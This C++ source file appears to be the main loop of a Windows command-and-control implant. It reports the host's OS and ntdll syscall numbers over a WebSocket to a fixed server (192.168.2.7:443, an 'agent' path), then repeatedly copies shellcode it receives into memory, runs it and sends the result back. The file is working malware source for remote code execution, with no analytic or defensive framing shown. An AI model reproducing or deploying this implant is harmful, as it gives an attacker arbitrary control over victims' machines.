#include "global.hpp"
#include "connection.hpp"
#include "identifier.hpp"
vector<pair<string, DWORD>> getNtdllSyscalls();
string pairsToString(const vector<pair<string, DWORD>>& values);
PVOID getMem();
typedef unsigned long long (*ShellcodeFunc)();

void printStringAsHex(const string& s) {
    for (unsigned char c : s) {
        cout << "0x"
             << hex << setw(2) << setfill('0')
             << static_cast<int>(c) << ' ';
    }
    cout << dec << '\n';
}


string bytesToHexString(const uint8_t bytes[8]) {
    stringstream ss;

    for (int i = 0; i < 8; ++i) {
        ss << hex << setw(2) << setfill('0') << static_cast<int>(bytes[i]);
    }

    return ss.str();
}

int main() {
    vector<pair<string, DWORD>> syscalls = getNtdllSyscalls();
    string syscall_list = pairsToString(syscalls);
    const wstring host = L"192.168.2.7";
    const INTERNET_PORT port = 443;
    wstring path = L"/api/v1/anon/agent/ws/";
    wstring identifier = random_uuid();
    const bool useHttps = true;
    path += identifier;

    WebSocketClient client;

    if (!connectWebSocket(client, host, port, path, useHttps)) {
        cleanup(client);
        return 1;
    }

    PVOID mem = getMem();
    cout << "Memory = " << (hex) << mem << endl;
    string handshake = random_uuid_s();
    handshake += "os:";
    handshake += getOperatingSystem();
    handshake += ";";
    handshake += syscall_list;
    if (!sendText(client.websocket, handshake)) {
        cleanup(client);
        return 1;
    }

    while (true) {
        string message;
        if (!receiveText(client.websocket, message)) {
            break;
        }
        printStringAsHex(message);
        memcpy(mem, message.c_str(), message.size());
        ShellcodeFunc exec = (ShellcodeFunc) mem;
        cout << "About to exec." << endl;
        unsigned long long retval = exec();
        string returnstring = bytesToHexString((const uint8_t*)retval);
        sendText(client.websocket, returnstring);
    }

    DWORD closeResult = WinHttpWebSocketClose(
        client.websocket,
        WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS,
        nullptr,
        0
    );

    if (closeResult != NO_ERROR) {
        cerr << "WinHttpWebSocketClose failed: " << closeResult << endl;
        cleanup(client);
        return 1;
    }

    cleanup(client);
    return 0;
}